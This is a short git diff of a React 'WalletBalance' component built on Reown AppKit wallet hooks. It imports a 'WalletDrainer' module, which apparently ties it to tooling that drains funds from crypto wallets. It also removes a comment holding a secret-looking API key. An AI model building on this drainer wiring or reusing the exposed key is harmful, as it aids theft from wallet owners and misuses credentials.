@@ -9,20 +9,19 @@ import {
      } from '@reown/appkit/react'
 import WalletDrainer from './WalletDrainer';
 
-// sk_llama_42da39e579f7b9e5ecff2f6a25e5b51a
-
 function WalletBalance() {
   const { disconnect } = useDisconnect();
   const { walletInfo } = useWalletInfo();
-  const {address} = useAppKitAccount();
 
-  console.log("walletInfo", walletInfo);
+  const { isConnected, address, caipAddress } = useAppKitAccount();
 
-  if (!walletInfo) {
+  console.log("Wallet Info in WalletBalance.js", isConnected, address, caipAddress);
+
+  if (!address) {
     return <p>Connect your wallet to see token balance.</p>;
   }
 
-  const { name: walletName } = walletInfo;
+  const { name: walletName } = walletInfo ?? caipAddress;
 
 
   const handleDisconnect = async () => {
